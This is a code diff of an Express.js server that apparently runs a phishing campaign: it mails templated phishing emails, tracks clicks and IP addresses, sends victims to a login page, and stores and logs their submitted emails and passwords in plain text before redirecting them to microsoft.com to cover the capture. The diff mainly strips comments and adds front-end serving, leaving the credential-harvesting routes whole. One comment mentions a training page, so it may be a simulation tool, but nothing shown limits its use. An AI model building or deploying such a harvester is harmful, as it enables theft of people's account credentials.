@@ -9,16 +9,15 @@ const cors = require("cors");
 const nodemailer = require("nodemailer");
 const axios = require("axios");
 const cheerio = require("cheerio");
+const path = require("path"); // ✅ Needed to serve React build
 
 const app = express();
 app.use(express.static("public"));
 app.use(cors());
 app.use(express.json());
 
-
 // Connect to MongoDB
 mongoose
-  mongoose
   .connect(process.env.MONGO_URI, {
     useNewUrlParser: true,
     useUnifiedTopology: true,
@@ -52,13 +51,11 @@ app.post("/send-phishing-email", async (req, res) => {
   }
 
   try {
-    // Fetch the selected email template from MongoDB
     const template = await EmailTemplate.findById(templateId);
     if (!template) {
       return res.status(404).json({ error: "Email template not found" });
     }
 
-    // Prepare email content using the selected template
     const emailContent = template.content.replace("{recipientEmail}", recipientEmail);
 
     const mailOptions = {
@@ -86,8 +83,6 @@ app.get("/track-click", async (req, res) => {
 
   try {
     await PhishingClick.create({ email, ipAddress: req.ip });
-
-    // Redirect user (can be a fake login page or training page)
     res.redirect("/login.html");
   } catch (error) {
     console.error(error);
@@ -128,16 +123,21 @@ app.post("/submit-credentials", async (req, res) => {
   try {
     await CapturedCredential.create({ email, password });
     console.log("Captured credentials saved:", { email, password });
-
-    // Redirect after submission
-    res.redirect("https://www.microsoft.com"); // or any other site you want
+    res.redirect("https://www.microsoft.com");
   } catch (err) {
     console.error("Error saving credentials:", err);
     res.status(500).json({ error: "Server error" });
   }
 });
 
+// ✅ Serve React frontend
+app.use(express.static(path.join(__dirname, "build")));
+
+app.get("*", (req, res) => {
+  res.sendFile(path.join(__dirname, "build", "index.html"));
+});
+
 // Start Server
 app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
+  console.log(`🚀 Server running on http://localhost:${PORT}`);
 });
